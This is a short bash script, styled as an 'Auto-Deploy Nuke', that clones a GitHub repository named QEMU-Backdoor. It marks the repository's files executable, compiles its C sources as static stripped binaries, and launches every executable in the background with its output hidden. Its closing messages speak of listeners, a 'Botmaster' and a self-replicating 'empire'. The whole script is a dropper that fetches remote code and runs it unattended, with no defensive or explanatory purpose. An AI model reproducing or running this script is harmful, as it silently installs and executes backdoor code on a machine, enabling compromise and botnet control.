#!/usr/bin/env bash
# SleepTheGod Auto-Deploy Nuke — clones + runs EVERY file in the repo
# One-liner chaos edition

REPO="https://github.com/SleepTheGod/QEMU-Backdoor.git"
DIR="$HOME/QEMU-Backdoor"

echo "[SleepTheGod] Cloning empire..."
git clone "$REPO" "$DIR" 2>/dev/null || (cd "$DIR" && git pull)

cd "$DIR" || exit 1

echo "[SleepTheGod] Making everything executable..."
find . -type f \( -name "*.sh" -o -name "*.py" -o -name "*.c" \) -exec chmod +x {} \;

echo "[SleepTheGod] Compiling any .c files..."
find . -name "*.c" -exec sh -c 'gcc -static -s -O2 -o "${1%.c}" "$1" 2>/dev/null || true' _ {} \;

echo "[SleepTheGod] Launching EVERY file into the void..."
find . -type f -executable -not -name "*.git*" | while read -r f; do
    echo "→ Running $f in background"
    nohup "$f" >/dev/null 2>&1 &
done

echo "[SleepTheGod] All files deployed and running. Check your listeners, Botmaster."
echo "Your empire is now self-replicating. Good luck fixing this, skids."
